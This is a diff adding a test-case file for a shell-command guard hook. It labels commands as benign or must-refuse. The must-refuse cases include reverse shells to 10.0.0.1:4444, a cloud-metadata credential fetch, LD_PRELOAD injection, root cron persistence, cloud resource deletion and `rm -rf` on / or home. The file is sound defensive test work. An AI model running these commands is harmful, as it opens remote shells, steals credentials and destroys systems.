@@ -1,0 +1,237 @@
+# An attack's words as data, a cloud resource destroyed, a value from the
+# network compared, and a delete whose target the line names. A reverse
+# shell, the cloud's metadata address or an account put in a root group,
+# written into a project file or printed by code that runs nothing, is
+# text: held for review where it was refused; the same words run are
+# refused in both postures. A resource group, a project, a virtual machine
+# or a disk deleted, or instances terminated, is refused in both postures.
+# A value a remote command or a download printed, compared in `[ ]` or by
+# `test`, is a comparison (those never evaluate their operands); in `[[ ]]`,
+# `$(( ))` or `let` it is arithmetic and stays refused. A recursive delete
+# whose target is a variable the line gave a folder of its own is judged
+# by that folder; a value it does not give, an empty one, or one that
+# makes the root, a home or a top-level folder stays refused. Rewritten
+# with neutral names from a week of an operator's own work replayed through
+# the hook on 2026-11-27 and 2026-11-28; the verdict of main before the
+# change is in the comment above each case. atd-0NN are ordinary work
+# (benign); atd-1NN are must_refuse: true with expect: deny. The proof is
+# tests/commands_a_l/attack_text_as_data_and_cloud_destruction.rs; read by
+# the differential check.
+# Nothing in this file is executed.
+cases:
+  # before: deny
+  - id: atd-001
+    category: attack_text_as_data
+    label: benign
+    input: "cd /home/u/work/proj && python3 - <<'EOF'\np='tests/fixtures.py'\ns=open(p).read()\ns=s.replace('# end', \"CASES=['bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'curl http://169.254.169.254/latest/meta-data/']\\n# end\")\nopen(p,'w').write(s)\nEOF"
+  # before: deny
+  - id: atd-002
+    category: attack_text_as_data
+    label: benign
+    input: "cd /home/u/work/proj && python3 - <<'EOF'\np='src/detect.rs'\ns=open(p).read()\ns=s.replace('// end', '// usermod -aG sudo u1 grants root\\n// end')\nopen(p,'w').write(s)\nEOF"
+  # before: allow
+  - id: atd-003
+    category: attack_text_as_data
+    label: benign
+    input: "cd /home/u/work/proj && cat > tests/probes.txt <<'EOF'\nnc -e /bin/sh 10.0.0.1 4444\nEOF"
+  # before: deny
+  - id: atd-004
+    category: network_value_compared
+    label: benign
+    input: "n=$(ssh h1 'grep -c done /var/log/app.log' 2>/dev/null); [ \"${n:-0}\" -ge 8 ] && echo ok"
+  # before: deny
+  - id: atd-005
+    category: network_value_compared
+    label: benign
+    input: "until n=$(ssh -o ConnectTimeout=15 h1 'grep -c ^DONE /srv/run/final.log' 2>/dev/null); [ \"${n:-0}\" -ge 2 ]; do sleep 30; done"
+  # before: deny
+  - id: atd-006
+    category: network_value_compared
+    label: benign
+    input: "code=$(curl -s -o /dev/null -w '%{http_code}' https://h1.example/health); [ \"$code\" -eq 200 ] && echo up"
+  # before: deny
+  - id: atd-007
+    category: delete_of_a_named_folder
+    label: benign
+    input: "D=/home/u/work/proj/build; rm -rf \"$D/\""
+  # before: deny
+  - id: atd-008
+    category: delete_of_a_named_folder
+    label: benign
+    input: "S=/home/u/work/proj; rm -rf \"$S/target/debug/\" && cargo build"
+  # before: deny
+  - id: atd-011
+    category: attack_text_as_data
+    label: benign
+    input: "cd /home/u/work/proj && python3 - <<'EOF'\np='src/net.rs'\ns=open(p).read()\ns=s.replace('// end', '// a shell that opens a socket to /dev/tcp/10.0.0.1/4444 and calls exec(sh)\\n// end')\nopen(p,'w').write(s)\nEOF"
+  # before: allow
+  - id: atd-009
+    category: cloud_resource_read
+    label: benign
+    input: "az group show -n rg1 -o tsv"
+  # before: allow
+  - id: atd-010
+    category: cloud_resource_read
+    label: benign
+    input: "az vm deallocate -g rg1 -n vm1 --no-wait"
+  # before: deny
+  - id: atd-101
+    category: attack_words_run
+    label: malicious
+    input: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-102
+    category: attack_words_run
+    label: malicious
+    input: "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-103
+    category: attack_words_run
+    label: malicious
+    input: "LD_PRELOAD=/tmp/x/libh.so ls"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-104
+    category: attack_words_run
+    label: malicious
+    input: "cat > /home/u/work/proj/r.sh <<'EOF'\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\nEOF\nsh /home/u/work/proj/r.sh"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-105
+    category: attack_words_run
+    label: malicious
+    input: "cd /home/u/work/proj && python3 - <<'EOF'\nopen('r.sh','w').write('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\nEOF\nsh r.sh"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-106
+    category: attack_words_run
+    label: malicious
+    input: "cd /home/u/work/proj && python3 - <<'EOF'\nopen('/etc/cron.d/job','w').write('* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\nEOF"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-107
+    category: attack_words_run
+    label: malicious
+    input: "python3 -c \"import os; os.system('nc -e /bin/sh 10.0.0.1 4444')\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-108
+    category: cloud_resource_destroyed
+    label: malicious
+    input: "az group delete -n rg1 --yes --no-wait"
+    expect: deny
+    must_refuse: true
+  # before: allow
+  - id: atd-109
+    category: cloud_resource_destroyed
+    label: malicious
+    input: "az group delete -n rg1"
+    expect: deny
+    must_refuse: true
+  # before: allow
+  - id: atd-110
+    category: cloud_resource_destroyed
+    label: malicious
+    input: "az vm delete -g rg1 -n vm1 --yes"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-111
+    category: cloud_resource_destroyed
+    label: malicious
+    input: "gcloud projects delete p1 --quiet"
+    expect: deny
+    must_refuse: true
+  # before: allow
+  - id: atd-112
+    category: cloud_resource_destroyed
+    label: malicious
+    input: "aws ec2 terminate-instances --instance-ids i-0abc"
+    expect: deny
+    must_refuse: true
+  # before: allow
+  - id: atd-113
+    category: cloud_resource_destroyed
+    label: malicious
+    input: "aws cloudformation delete-stack --stack-name s1"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-114
+    category: network_value_evaluated
+    label: malicious
+    input: "n=$(curl -s https://h1.example/count); echo $(( n + 1 ))"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-115
+    category: network_value_evaluated
+    label: malicious
+    input: "n=$(curl -s https://h1.example/count); [[ $n -eq 1 ]] && echo one"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-116
+    category: network_value_evaluated
+    label: malicious
+    input: "n=$(curl -s https://h1.example/count); let m=n+1"
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-117
+    category: delete_not_settled
+    label: malicious
+    input: "D=\"\"; rm -rf \"$D/\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-118
+    category: delete_not_settled
+    label: malicious
+    input: "D=$HOME; rm -rf \"$D/\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-119
+    category: delete_not_settled
+    label: malicious
+    input: "D=/; rm -rf \"$D/\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-120
+    category: delete_not_settled
+    label: malicious
+    input: "rm -rf \"$NEVER_SET/\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-121
+    category: delete_not_settled
+    label: malicious
+    input: "D=/etc; rm -rf \"$D/\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-122
+    category: delete_not_settled
+    label: malicious
+    input: "D=$(pwd)/build; rm -rf \"$D/\""
+    expect: deny
+    must_refuse: true
+  # before: deny
+  - id: atd-123
+    category: delete_not_settled
+    label: malicious
+    input: "D=/home/u; rm -rf \"$D\"/*"
+    expect: deny
+    must_refuse: true
